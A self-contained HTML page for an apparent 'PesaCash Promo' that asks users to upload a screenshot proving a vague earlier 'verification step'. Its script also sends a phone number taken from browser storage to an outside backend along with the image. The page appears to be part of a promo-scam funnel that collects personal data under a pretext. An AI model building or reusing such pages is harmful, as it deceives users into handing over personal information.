<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">

  <title>PesaCash - Upload Screenshot</title>

  <style>
    * {
      box-sizing: border-box;
    }

    body {
      margin: 0;
      min-height: 100vh;
      background: #f5f7fb;
      font-family: Arial, sans-serif;
      color: #111827;
      display: flex;
      align-items: center;
      justify-content: center;
    }

    .card {
      width: 92%;
      max-width: 400px;
      background: #ffffff;
      padding: 30px 22px;
      border-radius: 20px;
      text-align: center;
      box-shadow: 0 8px 30px rgba(0, 0, 0, 0.08);
    }

    .logo {
      font-size: 24px;
      font-weight: 800;
      margin-bottom: 8px;
    }

    .subtitle {
      color: #6b7280;
      font-size: 14px;
      line-height: 1.5;
      margin-bottom: 25px;
    }

    .step {
      display: inline-block;
      background: #dcfce7;
      color: #166534;
      padding: 7px 13px;
      border-radius: 20px;
      font-size: 13px;
      font-weight: 700;
      margin-bottom: 18px;
    }

    h1 {
      font-size: 24px;
      margin: 0 0 12px;
    }

    .instruction {
      color: #4b5563;
      font-size: 15px;
      line-height: 1.6;
      margin-bottom: 22px;
    }

    .upload-box {
      border: 2px dashed #d1d5db;
      border-radius: 14px;
      padding: 25px 15px;
      margin-bottom: 18px;
      background: #fafafa;
    }

    .upload-icon {
      font-size: 42px;
      margin-bottom: 10px;
    }

    .upload-text {
      font-size: 14px;
      color: #4b5563;
      margin-bottom: 15px;
    }

    input[type="file"] {
      width: 100%;
      font-size: 14px;
    }

    .upload-btn {
      display: block;
      width: 100%;
      padding: 16px;
      border: none;
      border-radius: 11px;
      background: #16a34a;
      color: white;
      font-size: 17px;
      font-weight: 700;
      cursor: pointer;
      margin-top: 15px;
    }

    .upload-btn:disabled {
      background: #9ca3af;
      cursor: not-allowed;
    }

    .upload-btn:active {
      transform: scale(0.98);
    }

    .status {
      margin-top: 15px;
      font-size: 14px;
      line-height: 1.5;
    }

    .note {
      margin-top: 17px;
      font-size: 12px;
      color: #6b7280;
      line-height: 1.5;
    }
  </style>
</head>

<body>

  <div class="card">

    <div class="logo">
      💰 PesaCash Promo
    </div>

    <div class="subtitle">
      Complete the final step below.
    </div>

    <div class="step">
      STEP 2 OF 2
    </div>

    <h1>📸 Upload Screenshot</h1>

    <div class="instruction">
      Upload a screenshot showing that you completed
      the previous verification step.
    </div>

    <div class="upload-box">

      <div class="upload-icon">
        📷
      </div>

      <div class="upload-text">
        Select your screenshot below.
      </div>

      <input
        type="file"
        id="screenshot"
        accept="image/*"
      >

    </div>

    <button
      class="upload-btn"
      id="uploadBtn"
      onclick="uploadScreenshot()"
    >
      UPLOAD SCREENSHOT
    </button>

    <div
      class="status"
      id="status"
    ></div>

    <div class="note">
      Make sure the screenshot is clear and readable.
    </div>

  </div>


  <script>

    async function uploadScreenshot() {

      const fileInput =
        document.getElementById("screenshot");

      const uploadBtn =
        document.getElementById("uploadBtn");

      const status =
        document.getElementById("status");

      const file =
        fileInput.files[0];


      if (!file) {

        status.textContent =
          "Please select a screenshot first.";

        return;
      }


      if (!file.type.startsWith("image/")) {

        status.textContent =
          "Please select an image file.";

        return;
      }


      uploadBtn.disabled = true;

      uploadBtn.textContent =
        "UPLOADING...";

      status.textContent =
        "Please wait...";


      const formData =
        new FormData();

      formData.append(
        "screenshot",
        file
      );


      const phone =
        localStorage.getItem("skizaPhone");


      if (phone) {

        formData.append(
          "phone",
          phone
        );

      }


      try {

        const response =
          await fetch(
            "https://skiza-backend.onrender.com/upload",
            {
              method: "POST",
              body: formData
            }
          );


        const data =
          await response.json();


        if (!response.ok) {

          throw new Error(
            data.message ||
            "Upload failed."
          );

        }


        status.textContent =
          "✅ Screenshot uploaded successfully!";

        uploadBtn.textContent =
          "UPLOADED";

      } catch (error) {

        console.error(error);

        status.textContent =
          "❌ Upload failed. Please try again.";

        uploadBtn.disabled = false;

        uploadBtn.textContent =
          "UPLOAD SCREENSHOT";

      }

    }

  </script>

</body>
</html>
